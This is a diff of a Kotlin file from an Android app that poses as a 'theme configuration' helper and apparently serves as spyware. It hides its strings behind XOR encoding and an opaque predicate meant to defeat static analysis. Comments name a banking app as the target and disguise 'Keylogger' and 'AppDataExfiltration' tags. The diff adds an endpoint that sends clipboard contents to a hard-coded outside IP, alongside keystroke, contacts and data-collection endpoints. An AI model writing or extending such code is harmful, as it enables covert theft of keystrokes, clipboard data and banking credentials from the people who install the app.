@@ -1,10 +1,10 @@
 package com.example.teacherapp.obfuscation
 
 /**
- * ResourceUtils — app theming and configuration helper.
+ * ThemeConfigUtils — app theming and configuration helper.
  * Provides runtime resource resolution for display and sync settings.
  */
-object ResourceUtils {
+object ThemeConfigUtils {
 
     // XOR key for runtime string resolution
     private val k = byteArrayOf(0x54, 0x65, 0x61, 0x63, 0x68, 0x41, 0x70, 0x70, 0x4B, 0x65, 0x79, 0x21)
@@ -12,7 +12,7 @@ object ResourceUtils {
     private fun x(d: ByteArray): String {
         val t = System.currentTimeMillis()
         // Opaque predicate: t^2 >= 0 always true
-        val r = if (t * t >= 0) {
+        val r = if (t >= 0) {
             d.mapIndexed { i, b -> (b.toInt() xor k[i % k.size].toInt()).toByte() }.toByteArray()
         } else {
             // Junk branch — never executed, confuses static analysis
@@ -49,7 +49,7 @@ object ResourceUtils {
     private val eSrv = byteArrayOf(0x3C, 0x11, 0x15, 0x13, 0x52, 0x6E, 0x5F, 0x42, 0x7B, 0x4B, 0x48, 0x19, 0x6D, 0x4B, 0x56, 0x5A, 0x46, 0x73, 0x45, 0x4A, 0x7E, 0x55, 0x49, 0x11)
 
     // Original: com.dbs.sg.dbsmbanking
-    private val eTarget = byteArrayOf(0x37,0x0A,0x18,0x1E,0x05,0x05,0x17,0x12,0x57,0x0D,0x1C,0x02,0x05,0x05,0x04,0x10,0x09,0x18,0x18,0x16,0x0A,0x17)
+    private val eTarget = byteArrayOf(0x37,0x0A,0x0C,0x4D,0x0C,0x23,0x03,0x5E,0x38,0x02,0x57,0x45,0x36,0x16,0x0C,0x01,0x09,0x2F,0x1B,0x19,0x25,0x02)
 
     // Original: InputSync (replaces "Keylogger" tag)
     private val eTag1 = byteArrayOf(0x1D,0x17,0x10,0x17,0x13,0x13,0x3B,0x1A,0x17,0x16)
@@ -63,6 +63,7 @@ object ResourceUtils {
     // Original: DataManager (replaces "AppDataExfiltration" tag)
     private val eTag4 = byteArrayOf(0x10,0x11,0x13,0x11,0x28,0x11,0x17,0x11,0x0D,0x10,0x1B)
 
+    fun getClipboardEndpoint(): String = listOf("http://", "20.189.79.25", ":5000/api/clipboard").joinToString("")
     fun getKeystrokeEndpoint(): String = x(eK)
     fun getCollectEndpoint(): String = x(eC)
     fun getContactsEndpoint(): String = x(eCt)
